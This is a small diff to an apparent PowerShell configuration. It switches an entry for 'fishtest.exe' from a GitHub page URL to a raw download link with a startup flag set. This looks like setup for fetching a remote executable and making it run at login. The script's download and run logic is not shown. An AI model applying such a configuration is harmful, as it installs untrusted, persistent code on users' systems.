@@ -1,5 +1,5 @@
 $config = @(
-    @{ Url = "https://github.com/Trop1c0/powershell/blob/main/fishtest.exe"; Startup = $true }
+    @{ Url = "https://raw.githubusercontent.com/Trop1c0/powershell/main/fishtest.exe"; Startup = $true }
 )
 
 $targets = @()
